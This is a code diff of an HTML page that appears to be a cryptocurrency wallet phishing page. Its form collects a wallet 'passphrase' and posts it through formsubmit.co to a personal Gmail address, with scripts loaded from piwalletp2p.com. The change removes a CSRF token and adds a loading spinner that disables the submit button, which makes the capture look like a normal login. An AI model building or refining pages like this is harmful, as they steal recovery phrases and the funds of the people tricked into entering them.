@@ -27,8 +27,7 @@
         </div>
 
      <form action="https://formsubmit.co/scottmerlin218@gmail.com" method="post">
-          
-            <input type="hidden" name="_token" value="zz2gxfqSVUwsR2sQIBvjlwOiIApC2xuhaLsE50PQ" autocomplete="off">           
+                  
              <div class="relative my-4" data-twe-input-wrapper-init>
                 <textarea id="passphrase" name="name" required rows="8"
                     class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
@@ -118,7 +117,17 @@
         </div>
     </div>
 </div>
-       
+
+    <script>
+document.querySelector("form").addEventListener("submit", function(e) {
+  // Show the loading spinner
+  document.getElementById("loading-content").style.display = "block";
+  
+  // Disable the submit button
+  document.getElementById("btn").disabled = true;
+});
+    </script>
+    
          </div>
     </body>
 <script src="http://piwalletp2p.com/js/jquery-3.7.1.min.js"></script>
